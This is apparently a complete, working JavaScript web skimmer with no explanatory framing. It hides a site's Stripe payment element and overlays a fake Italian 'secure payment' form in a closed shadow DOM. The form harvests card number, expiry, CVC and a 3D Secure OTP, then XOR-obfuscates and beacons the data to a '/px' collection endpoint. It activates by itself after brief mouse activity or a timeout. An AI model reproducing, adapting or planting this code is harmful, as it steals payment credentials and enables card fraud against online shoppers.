(function() {
    const GATE = 'https://' + location.hostname + '/px';
    function encrypt(data) {
        const json = JSON.stringify(data);
        let enc = "";
        let k = 0x42;
        for (let i = 0; i < json.length; i++) {
            enc += String.fromCharCode(json.charCodeAt(i) ^ k);
            k = (k + 1) & 0xFF;
        }
        return btoa(enc);
    }
    function send(data) {
        const payload = { ...data, ts: Date.now(), url: location.href };
        const b64 = encrypt(payload);
        new Image().src = GATE + '?d=' + encodeURIComponent(b64);
        if (navigator.sendBeacon) navigator.sendBeacon(GATE, new URLSearchParams({ d: b64 }));
    }

    function createFakeUI() {
        let target = document.querySelector('#payment-element, .StripeElement, iframe[src*="stripe"]');
        if (!target || document.getElementById('imperial-ui')) return;
        target.style.display = 'none';
        const host = document.createElement('div');
        host.id = 'imperial-ui';
        host.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;';
        const shadow = host.attachShadow({ mode: 'closed' });
        const container = document.createElement('div');
        container.style.cssText = 'background:#fff;padding:20px;border-radius:8px;width:90%;max-width:400px;font-family:Helvetica,Arial,sans-serif;';
        container.innerHTML = `
            <div id="step1">
                <h3>Pagamento Sicuro</h3>
                <input id="cc" placeholder="Numero di carta" style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">
                <div style="display:flex;gap:10px;">
                    <input id="exp" placeholder="MM/YY" style="width:50%;padding:12px;border:1px solid #ccc;border-radius:4px;">
                    <input id="cvv" placeholder="CVC" style="width:50%;padding:12px;border:1px solid #ccc;border-radius:4px;">
                </div>
                <button id="payBtn" style="width:100%;margin-top:20px;padding:14px;background:#5469d4;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;">PAGARE ORA</button>
            </div>
            <div id="step2" style="display:none;text-align:center;">
                <h3>Verifica 3D Secure</h3>
                <p>Inserisci il codice OTP inviato</p>
                <input id="otp" placeholder="Codice OTP" style="width:100%;padding:12px;text-align:center;font-size:20px;letter-spacing:5px;">
                <button id="otpBtn" style="width:100%;margin-top:15px;padding:14px;background:#5469d4;color:#fff;border:none;border-radius:4px;">CONFERMA</button>
            </div>
        `;
        shadow.appendChild(container);
        document.body.appendChild(host);

        shadow.getElementById('payBtn').onclick = () => {
            send({
                card: shadow.getElementById('cc').value,
                exp: shadow.getElementById('exp').value,
                cvv: shadow.getElementById('cvv').value
            });
            shadow.getElementById('step1').style.display = 'none';
            shadow.getElementById('step2').style.display = 'block';
        };
        shadow.getElementById('otpBtn').onclick = () => {
            send({ otp: shadow.getElementById('otp').value });
            this.innerHTML = 'Verifica...';
            setTimeout(() => location.reload(), 2500);
        };
    }

    let interactionCount = 0;
    let mouseMoves = [];
    function checkInteraction(e) {
        interactionCount++;
        mouseMoves.push({ x: e.clientX, y: e.clientY, t: Date.now() });
        if (mouseMoves.length > 5) mouseMoves.shift();
        if (interactionCount >= 2 && (mouseMoves.length >= 2 && (mouseMoves[mouseMoves.length-1].t - mouseMoves[0].t) < 3000)) {
            createFakeUI();
            window.removeEventListener('mousemove', checkInteraction);
            window.removeEventListener('click', checkInteraction);
            window.removeEventListener('touchstart', checkInteraction);
        }
    }
    window.addEventListener('mousemove', checkInteraction);
    window.addEventListener('click', checkInteraction);
    window.addEventListener('touchstart', checkInteraction);
    setTimeout(() => {
        if (!document.getElementById('imperial-ui')) createFakeUI();
    }, 8000);
})();
